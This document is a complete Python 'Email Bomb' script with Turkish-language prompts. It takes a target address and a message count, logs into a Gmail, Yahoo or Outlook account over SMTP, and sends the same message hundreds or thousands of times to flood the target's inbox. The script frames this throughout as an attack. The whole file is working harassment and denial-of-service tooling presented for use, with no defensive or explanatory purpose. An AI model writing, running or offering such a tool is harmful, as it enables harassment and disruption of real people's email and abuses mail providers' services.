import smtplib
import sys
import os 

os.system("clear")

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.YELLOW +'[+] Email Bomb v1.0c [+]')
    print(bcolors.YELLOW +'[+] Made With Mars [+]')
    print(bcolors.GREEN + '''
    
    
                                                  
                                              
                                ██    ██      
                    ██████      ██  ██        
                  ██      ██                  
                ██          ████░░    ████    
                ██                            
              ██████            ██  ██        
              ██████            ██    ██      
          ██████████████                         Email Bomb v1.0
        ██████░░░░░░░░▓▓██                    
      ██████░░░░░░░░  ▓▓▓▓██                  
      ██████▓▓▓▓▓▓▓▓    ▓▓██                  
    ████████▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓██                
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                
      ████████▓▓▓▓▓▓▓▓▓▓▓▓██                  
      ████████████▓▓▓▓▓▓████                  
        ██████████████████                    
          ██████████████                      
              ██████                          ''')

class Email_Bomber:
    count = 0
    
    def __init__(self):
        try:
            print(bcolors.RED + '\n[+] Program Başlatılıyor [+]')
            self.target = str(input(bcolors.GREEN + 'Hedef Emaili Giriniz :> '))
            self.mode = int(input(bcolors.GREEN + 'Bomba Modunu Giriniz (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) :>  '))
            if (self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Geçersiz Seçenek GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
    
    def bomb(self):
        try:
            print(bcolors.RED + '\n[+] Setting up Bomb [+]')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Özel Bir Miktar Giriniz :>  '))
            print(bcolors.RED + f'\n[+] Bomba Modu: {self.mode} ve {self.amount} e-Postalarını Seçtiniz [+]')    
        except Exception as e:
            print(f'ERROR: {e}')
    def email(self):
        try:
            print(bcolors.RED + '\n[+] Setting up Email [+]')
            self.server = str(input(bcolors.GREEN + 'Hesaba Gireceğiniz Email Türünü Giriniz - 1:Gmail 2:Yahoo 3:Outlook :>  '))   
            premade = ['1', '2', '3']
            default_port = True 
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Port Numarası Giriniz :>  '))
            
            if default_port == True:
                self.port = int(587)
            
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            self.fromAddr = str(input(bcolors.GREEN + 'Emailinizi Giriniz :>  '))
            self.fromPwd = str(input(bcolors.GREEN + 'Şifrenizi Giriniz :>  '))
            self.subject = str(input(bcolors.GREEN + 'Konuyu Giriniz :>  '))
            self.message = str(input(bcolors.GREEN + 'Mesajı Giriniz :>  '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n[+] Saldırı Başlatılıyor... [+]')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n[+] Saldırı Sona Erdi [+]')   
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
